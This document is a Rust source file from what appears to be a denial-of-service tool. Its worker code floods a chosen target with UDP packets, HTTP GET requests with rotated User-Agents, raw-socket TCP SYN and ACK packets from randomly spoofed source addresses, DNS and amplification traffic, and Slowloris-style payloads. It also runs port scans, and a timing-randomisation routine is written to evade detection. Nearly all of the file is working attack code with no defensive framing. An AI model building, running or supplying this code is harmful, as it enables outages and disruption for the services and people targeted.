use crate::network::network::SocketPool;
use crate::network::port_scanner::EnhancedPortScanner;
use crate::utils::pool::{SharedObjectPool, TieredBufferPool, OptimizedBuffer};
use crate::network::raw_socket::{CrossPlatformRawSocket, RawSocketType};

#[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
use pnet::datalink;
use crate::types::types::*;
use rand::Rng;
use std::collections::VecDeque;
use std::sync::atomic::Ordering;
use std::sync::{Arc, Mutex};
use std::thread;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::task::JoinSet;
use tokio::time::{Duration, Instant};
use std::net::Ipv4Addr;

pub async fn start_atkworkers(
    config: AtkConfig,
    stats: Arc<AtkStats>,
    logs: Arc<Mutex<VecDeque<String>>>,
) {
    if config.secondary_attack {
        launch_multi_vector_attack(config, stats, logs).await; // run multi-vector attack
    } else {
        // optimized based on CPU cores
        let num_cores = thread::available_parallelism()
            .map(|n| n.get())
            .unwrap_or(4);
        let workers_per_core = (config.threads + num_cores - 1) / num_cores;

        let mut join_set = JoinSet::new();

        for core_id in 0..num_cores {
            let start_worker = core_id * workers_per_core;
            let end_worker = std::cmp::min(start_worker + workers_per_core, config.threads);

            if start_worker >= config.threads {
                break;
            }

            // create a worker group for this core
            let worker_config = config.clone();
            let worker_stats = stats.clone();
            let worker_logs = logs.clone();

            join_set.spawn(async move {
                let mut handles = Vec::new();
                for worker_id in start_worker..end_worker {
                    let config = worker_config.clone();
                    let stats = worker_stats.clone();
                    let logs = worker_logs.clone();

                    handles.push(tokio::spawn(async move {
                        if let Err(e) = attack_worker(worker_id, config, stats, logs).await {
                            eprintln!("Worker {} error: {}", worker_id, e);
                        }
                    }));
                }

                // wait for workers in group
                for handle in handles {
                    handle.await.unwrap();
                }
            });
        }

    {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!(
            "Optimized for {} CPU cores, {} workers per core. Total workers to spawn: {}",
            num_cores, workers_per_core, config.threads
        ));
        if log_queue.len() > 100 {
            log_queue.pop_front();
        }
    }

    // Wait for all worker groups to complete
    while let Some(result) = join_set.join_next().await {
        if let Err(e) = result {
            let mut log_queue = logs.lock().unwrap();
            log_queue.push_back(format!("Worker group error: {}", e));
            if log_queue.len() > 100 {
                log_queue.pop_front();
            }
            drop(log_queue); // Drop the guard before the next await
        }
    }
}

async fn launch_multi_vector_attack(
    config: AtkConfig,
    stats: Arc<AtkStats>,
    logs: Arc<Mutex<VecDeque<String>>>,
) {
    let mut handles = vec![];
    let primary_threads = (config.threads as f64 * 0.6) as usize;
    for worker_id in 0..primary_threads {
        let mut worker_config = config.clone();
        worker_config.threads = 1;
        worker_config.rate = config.rate / primary_threads as u64;
        let worker_stats = stats.clone();
        let worker_logs = logs.clone();

        handles.push(tokio::spawn(async move {
            if let Err(e) = attack_worker(worker_id, worker_config, worker_stats, worker_logs).await
            {
                eprintln!("Primary worker {} error: {}", worker_id, e);
            }
        }));
    }

    let secondary_threads = config.threads - primary_threads;
    for worker_id in primary_threads..(primary_threads + secondary_threads) {
        let mut worker_config = config.clone();
        worker_config.threads = 1;
        worker_config.rate = config.rate / secondary_threads as u64;

        worker_config.mode = match config.mode {
            AtkMode::Flood => AtkMode::Amplification,
            AtkMode::Amplification => AtkMode::Amplification,
                        _ => AtkMode::Flood,
        };

        worker_config.port = match config.mode {
            AtkMode::DNSQuery => 53,
            AtkMode::Amplification => 123,
                        _ => config.port,
        };

        let worker_stats = stats.clone();
        let worker_logs = logs.clone();

        handles.push(tokio::spawn(async move {
            if let Err(e) = attack_worker(worker_id, worker_config, worker_stats, worker_logs).await
            {
                eprintln!("Secondary worker {} error: {}", worker_id, e);
            }
        }));
    }

    for handle in handles {
        handle.await.unwrap();
    }
}

async fn attack_worker(
    worker_id: usize,
    config: AtkConfig,
    stats: Arc<AtkStats>,
    logs: Arc<Mutex<VecDeque<String>>>,
) -> Result<(), Box<dyn std::error::Error>> {
    
    let pool_size = std::cmp::min(10, config.threads.max(1));
    let mut socket_pool = SocketPool::new_optimized(pool_size).await;

    // Initialize raw socket for TCP modes if available
    let interface_name = config.interface.as_ref().map_or_else(|| {
        #[cfg(all(target_os = "windows", feature = "pnet_datalink"))]
        {
            // Just use the first available interface
            match datalink::interfaces().first() {
                Some(iface) => iface.name.clone(),
                None => {
                    println!("Warning: No network interfaces found for raw sockets");
                    String::new()
                }
            }
        }
        #[cfg(not(all(target_os = "windows", feature = "pnet_datalink")))]
        {
            if cfg!(target_os = "linux") { "eth0" } else { "en0" }.to_string()
        }
    }, |s| s.clone());

    let mut raw_socket = CrossPlatformRawSocket::new(&interface_name);
    let use_raw_sockets = matches!(config.mode, AtkMode::TCP | AtkMode::TCPConnect) && raw_socket.is_available();

    {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!(
            "Worker {} started - Mode: {:?}, Raw sockets available: {}",
            worker_id, config.mode, raw_socket.is_available()
        ));

        if use_raw_sockets {
            log_queue.push_back(format!(
                "Worker {} using raw sockets for TCP mode",
                worker_id
            ));
        }
    }

    if socket_pool.is_empty() && !use_raw_sockets {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!("Worker {} failed to create any sockets", worker_id));
        log_queue.push_back(format!("Socket pool empty: {}, Raw sockets: {}", socket_pool.is_empty(), use_raw_sockets));
        return Err("No sockets available".into());
    }

    let buffer_pool = Arc::new(TieredBufferPool::new(
        512, // small
        2048, // med
        65507, // large (max UDP)
        50, // pool size per tier
    ));
    let _string_pool = SharedObjectPool::new(|| String::with_capacity(64), 50);
    {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!(
            "Worker {} initialized with object pools",
            worker_id
        ));
        if log_queue.len() > 100 {
            log_queue.pop_front();
        }
    }

    let packets_per_thread = config.rate / config.threads as u64;
    let base_delay = if packets_per_thread > 0 {
        1000 / packets_per_thread
    } else {
        100
    };

    {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!(
            "Worker {} started: {} PPS, Target: {}:{}",
            worker_id, packets_per_thread, config.target, config.port
        ));
        log_queue.push_back(format!(
            "Worker {} duration: {}s, Mode: {:?}",
            worker_id, config.duration, config.mode
        ));
        if log_queue.len() > 100 {
            log_queue.pop_front();
        }
    }

    let start_time = Instant::now();
    let mut last_update = start_time;
    let mut local_packets = 0u64;
    let mut local_bytes = 0u64;

    {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!(
            "Worker {} entering main loop - is_running: {}",
            worker_id, stats.is_running.load(Ordering::Relaxed)
        ));
    }

    while stats.is_running.load(Ordering::Relaxed)
        && start_time.elapsed() < Duration::from_secs(config.duration)
    {
        if !stats.is_running.load(Ordering::Relaxed) {
            break;
        }

        let target_port = if config.mode == AtkMode::PortScan {
            // for port scan mode, cycle through common ports
            let ports = [
                21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 161, 194, 443, 993, 995, 1433, 1521,
                3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017,
            ];
            ports[(local_packets % ports.len() as u64) as usize]
        } else if config.random_ports {
            rand::rng().random_range(1024..65535)
        } else {
            config.port
        };

        let target_addr = format!("{}:{}", config.target, target_port);

        if config.mode == AtkMode::PortScan && local_packets % 20 == 0 {
            let scan_results = EnhancedPortScanner::quick_scan(&config.target).await;
            let open_ports: Vec<u16> = scan_results
                .iter()
                .filter(|p| p.state == crate::network::port_scanner::PortState::Open)
                .map(|p| p.port)
                .collect();
            let mut status = stats.target_status.lock().unwrap();
            status.open_ports = open_ports;
            status.open_ports.sort();

            // Log scan results
            let mut log_queue = logs.lock().unwrap();
            for result in scan_results {
                if result.state == crate::network::port_scanner::PortState::Open {
                    let service_info = result.service.unwrap_or("unknown".to_string());
                    let banner_info = result.banner.unwrap_or_else(|| "".to_string());
                    log_queue.push_back(format!(
                        "Port {}/{} is open - {} {}",
                        result.port, result.protocol, service_info, banner_info
                    ));
                }
            }
        }

        if local_packets == 0 {
            let mut log_queue = logs.lock().unwrap();
            log_queue.push_back(format!("Worker {} targeting {}", worker_id, target_addr));
        }

        
        let batch_size = if config.mode == AtkMode::Amplification && config.burst_size > 0 {
            config.burst_size.min(20) as usize // send up to 20 packets
        } else if config.mode == AtkMode::Flood {
            (packets_per_thread / 10).max(1).min(50) as usize // dynamic batch size based on rate
        } else {
            1
        };

        let mut packets_sent = 0;
        let mut total_bytes = 0;
        let mut batch_packets = Vec::with_capacity(batch_size);
        for i in 0..batch_size {
            let packet_size = get_chunk_size(&config, local_packets + i as u64);
            let mut buffer = OptimizedBuffer::new(packet_size, buffer_pool.clone());
            let payload = craft_spam_packet(&config, packet_size);
            let payload_len = payload.len();
            buffer.set_len(payload_len);
            buffer.as_mut_slice().copy_from_slice(&payload);
            batch_packets.push(buffer);
        }

        let target_addr = if let Some(addr) = socket_pool
            .get_target_address(&config.target, target_port)
            .await
        {
            addr
        } else {
            continue; // skip if resolution fails
        };

        if !stats.is_running.load(Ordering::Relaxed) {
            break;
        }

        let socket = socket_pool.get_socket().await;
        if socket.is_none() {
            continue;
        }
        let socket = socket.unwrap();

        match config.mode {
            AtkMode::TCPConnect => {
                {
                    let mut log_queue = logs.lock().unwrap();
                    log_queue.push_back(format!(
                        "Worker {} executing TCPConnect mode (raw sockets: {})",
                        worker_id, use_raw_sockets
                    ));
                }

                if use_raw_sockets {
                    // use raw sockets for TCP SYN flood
                    for _ in 0..batch_size {
                        let target_ip = config.target.parse::<Ipv4Addr>()
                            .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

                        let src_ip = Ipv4Addr::new(
                            rand::rng().random(),
                            rand::rng().random(),
                            rand::rng().random(),
                            rand::rng().random(),
                        );
                        let src_port = rand::rng().random_range(1024..65535);

                        if let Err(_) = raw_socket.send_tcp_packet(
                            src_ip, target_ip, src_port, config.port,
                            RawSocketType::TcpSyn
                        ) {
                            stats.add_failed();
                        } else {
                            stats.add_packet(40);
                            packets_sent += 1;
                            total_bytes += 40;
                        }
                    }
                } else {
                    // fallback to TCP
                    for _ in 0..batch_size {
                        let tcp_target = format!("{}:{}", config.target, config.port);
                        let _ = tokio::time::timeout(
                            Duration::from_millis(100),
                            TcpStream::connect(&tcp_target),
                        )
                        .await;
                        // Count connection attempts regardless of success/failure
                        stats.add_packet(40);
                        packets_sent += 1;
                        total_bytes += 40;
                    }
                }
            }
            AtkMode::HTTP => {
                // HTTP flood w batch processing
                let http_target = format!("{}:{}", config.target, config.port);
                if let Ok(Ok(mut stream)) = tokio::time::timeout(
                    Duration::from_millis(500),
                    TcpStream::connect(&http_target),
                )
                .await
                {
                    for buffer in &batch_packets {
                        let result = tokio::time::timeout(
                            Duration::from_millis(200),
                            stream.write_all(buffer.as_slice()),
                        )
                        .await;
                        match result {
                            Ok(Ok(_)) => {
                                stats.add_packet(buffer.len() as u64);
                                packets_sent += 1;
                                total_bytes += buffer.len() as u64;
                            }
                            _ => {
                                stats.add_failed();
                                break;
                            }
                        }
                    }
                }
            }
            // use raw sockets if available
            AtkMode::TCP => {
                if use_raw_sockets {
                    for _ in 0..batch_size.min(5) {
                        let target_ip = config.target.parse::<Ipv4Addr>()
                            .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

                        let src_ip = Ipv4Addr::new(
                            rand::rng().random(),
                            rand::rng().random(),
                            rand::rng().random(),
                            rand::rng().random(),
                        );
                        let src_port = rand::rng().random_range(1024..65535);

                        if let Err(_) = raw_socket.send_tcp_packet(
                            src_ip, target_ip, src_port, config.port,
                            RawSocketType::TcpAck
                        ) {
                            stats.add_failed();
                        } else {
                            stats.add_packet(40);
                            packets_sent += 1;
                            total_bytes += 40;
                        }
                    }
                } else {
                    // fallback to regular TCP connections
                    for _ in 0..batch_size.min(5) {
                        let tcp_target = format!("{}:{}", config.target, config.port);
                        let _ = tokio::time::timeout(
                            Duration::from_millis(50),
                            TcpStream::connect(&tcp_target),
                        )
                        .await;
                        stats.add_packet(40);
                        packets_sent += 1;
                        total_bytes += 40;
                    }
                }
            }
            _ => {
                // UDP batch sending
                let packet_slices: Vec<&[u8]> =
                    batch_packets.iter().map(|b| b.as_slice()).collect();

                match socket_pool
                    .send_batch(&socket, target_addr, &packet_slices)
                    .await
                {
                    Ok(_total_sent) => {
                        for buffer in &batch_packets {
                            stats.add_packet(buffer.len() as u64);
                            packets_sent += 1;
                            total_bytes += buffer.len() as u64;
                        }
                    }
                    Err(e) => {
                        for _ in &batch_packets {
                            stats.add_failed();
                        }
                        // log batch error once
                        if local_packets <= 3 {
                            let mut log_queue = logs.lock().unwrap();
                            log_queue.push_back(format!(
                                "Worker {} batch send failed: {}",
                                worker_id, e
                            ));
                        }
                    }
                }
            }
        }

        // update counters
        local_packets += packets_sent;
        local_bytes += total_bytes;

        // update bandwidth every batch for peak tracking
        if total_bytes > 0 {
            stats.update_bandwidth(total_bytes);
        }

        // update history every 5 seconds
        if last_update.elapsed() >= Duration::from_secs(5) {
            let elapsed = last_update.elapsed().as_secs_f64();
            if elapsed > 0.0 {
                let pps = local_packets as f64 / elapsed;
                let bandwidth = (local_bytes as f64 * 8.0) / elapsed; // bits per second

                stats.update_history(pps as u64, bandwidth / 1_000_000.0); // Mbps
            }

            last_update = Instant::now();
            local_packets = 0;
            local_bytes = 0;
        }

        let adjusted_delay = if batch_size > 1 {
            base_delay / batch_size as u64
        } else {
            base_delay
        };

        let evasion_delay = calc_evasdelay(
            &config.evasion_mode,
            adjusted_delay,
            local_packets,
            config.variance_percentage,
            config.burst_size,
        );

        tokio::time::sleep(evasion_delay).await;
    }

    // Final log
    {
        let mut log_queue = logs.lock().unwrap();
        log_queue.push_back(format!("Worker {} finished", worker_id));
        if log_queue.len() > 100 {
            log_queue.pop_front();
        }
    }

    Ok(())
}

fn calc_evasdelay(
    evasion_mode: &EvasMode,
    base_delay: u64,
    packet_count: u64,
    variance_percent: u8,
    burst_size: u32,
) -> Duration {
    match evasion_mode {
        EvasMode::Fixed => Duration::from_millis(base_delay),
        EvasMode::Random => {
            let variance = (base_delay as f64 * variance_percent as f64 / 100.0) as i64;
            let delay = if variance > 0 {
                base_delay as i64 + rand::rng().random_range(-variance..=variance)
            } else {
                base_delay as i64
            };
            Duration::from_millis(delay.max(1) as u64)
        }
        EvasMode::Adaptive => {
            let base_factor = if packet_count % 100 < 80 {
                1.0 // Normal
            } else if packet_count % 100 < 95 {
                0.5 // Faster 15% of the time
            } else {
                2.0 // Slower 5% of the time
            };

            let random_factor = 0.8 + rand::rng().random::<f64>() * 0.4; // ±20%
            let delay = (base_delay as f64 * base_factor * random_factor) as u64;
            Duration::from_millis(delay.max(1))
        }
        EvasMode::Exponential => {
            let exponent = (packet_count % 10) as u32;
            let delay = (2u64.pow(exponent)) * base_delay / 8;
            Duration::from_millis(delay.min(base_delay * 10))
        }
        EvasMode::Burst => {
            // Burst mode: send burst_size packets rapidly, then pause
            if packet_count % burst_size as u64 == 0 {
                Duration::from_millis(base_delay * 10)
            } else {
                Duration::from_millis(1)
            }
        }
    }
}

fn get_chunk_size(config: &AtkConfig, packet_count: u64) -> usize {
    match config.size_strategy {
        SizeStrategy::Fixed => config.packet_size.max(64),
        SizeStrategy::Random => {
            rand::rng().random_range(64..1472) // MTU range for UDP
        }
        SizeStrategy::Oscillating => {
            let base = config.packet_size.max(64) as i16;
            let oscillation = ((packet_count % 20) as i16 - 10) * 30;
            (base + oscillation).max(64).min(1472) as usize
        }
    }
}

fn craft_spam_packet(config: &AtkConfig, packet_size: usize) -> Vec<u8> {
    if !config.custom_payload.is_empty() {
        let mut payload = config.custom_payload.as_bytes().to_vec();
        payload.resize(packet_size, b'X');
        return payload;
    }

    if config.random_payload {
        let safe_packet_size = packet_size.max(1);
        return (0..safe_packet_size)
            .map(|_| rand::rng().random::<u8>())
            .collect();
    }

    match config.mode {
        AtkMode::Flood => {
            let base = format!("UDP_FLOOD_PACKET_{}", rand::rng().random::<u32>());
            let mut payload = base.as_bytes().to_vec();
            payload.resize(packet_size, b'X');
            payload
        }
        AtkMode::Amplification => {
            let mut payload = Vec::with_capacity(packet_size);
            for i in 0..packet_size {
                payload.push(((i * 7) ^ 0x55) as u8);
            }
            payload
        }
        AtkMode::Fragmentation => {
            let mut payload = Vec::with_capacity(packet_size);
            for i in 0..packet_size {
                payload.push((i % 256) as u8);
            }
            payload
        }
        AtkMode::Slowloris => {
            let mut payload = b"SLOWLORIS_KEEP_ALIVE_PACKET".to_vec();
            payload.resize(packet_size, b'S');
            payload
        }
        AtkMode::Burst => {
            let base = format!("BURST_ATTACK_DATA_{}", rand::rng().random::<u64>());
            let mut payload = base.as_bytes().to_vec();
            payload.resize(packet_size, b'B');
            payload
        }
        AtkMode::DNSQuery => generate_dns_query(packet_size),
        AtkMode::PortScan => {
            // vary the target port
            let ports_to_scan = [
                21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 161, 194, 443, 993, 995, 1433, 1521,
                3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017,
            ];
            let scan_port = ports_to_scan[rand::rng().random_range(0..ports_to_scan.len())];
            format!("PORT_SCAN_{}_{}", scan_port, rand::rng().random::<u32>()).into_bytes()
        }
        AtkMode::UDP => {
            format!("UDP_PACKET_{}", rand::rng().random::<u32>()).into_bytes()
        }
        AtkMode::TCPConnect => {
            // TCP connection mode uses TcpStream::connect() directly
            // this payload is not actually used
            // i will delete it later
            b"TCP_CONNECT".to_vec()
        }
        AtkMode::HTTP => {
            // HTTP GET request flood with User-Agent rotation
            let user_agent = if config.rotate_user_agent && !config.user_agents.is_empty() {
                let idx = rand::rng().random_range(0..config.user_agents.len());
                &config.user_agents[idx]
            } else {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            };

            let http_request = format!(
                "GET /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
                rand::rng().random_range(1000..9999),
                config.target,
                user_agent
            );
            let mut payload = http_request.as_bytes().to_vec();
            payload.resize(packet_size.min(1500), b' ');
            payload
        }
        AtkMode::DNSFlood => {
            generate_random_dns_query(packet_size)
        }
        AtkMode::TCP => {
            let tcp_info = format!(
                "TCP_{}_{:08x}",
                config.mode.to_string(),
                rand::rng().random::<u32>()
            );
            let mut payload = tcp_info.as_bytes().to_vec();
            payload.resize(packet_size, 0);
            payload
        }
    }
}

fn generate_dns_query(size: usize) -> Vec<u8> {
    // DNS query for amplification attack
    let mut payload = vec![
        0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77,
        0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01,
        0x00, 0x01,
    ];
    payload.resize(size, 0);
    payload
}


fn generate_random_dns_query(size: usize) -> Vec<u8> {
    // Generate random DNS queries
    let mut payload = vec![
        0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];

    // Random domain name
    let domains = [
        "www.google.com",
        "www.facebook.com",
        "www.youtube.com",
        "www.twitter.com",
        "www.instagram.com",
        "www.amazon.com",
        "random.xyz",
        "test.domain",
        "example.org",
        "demo.site",
    ];
    let domain = domains[rand::rng().random_range(0..domains.len())];

    // Add domain labels
    for label in domain.split('.') {
        payload.push(label.len() as u8);
        payload.extend_from_slice(label.as_bytes());
    }
    payload.push(0); // End of domain

    // Query type (A, AAAA, MX, etc.)
    let query_types = [0x0001u16, 0x001cu16, 0x000fu16, 0x0002u16, 0x0010u16]; // A, AAAA, MX, NS, TXT
    let query_type = query_types[rand::rng().random_range(0..query_types.len())];
    payload.extend_from_slice(&query_type.to_be_bytes());
    payload.push(0x00); // Query class (IN)
    payload.push(0x01);

    payload.resize(size, 0);
    payload
}
}
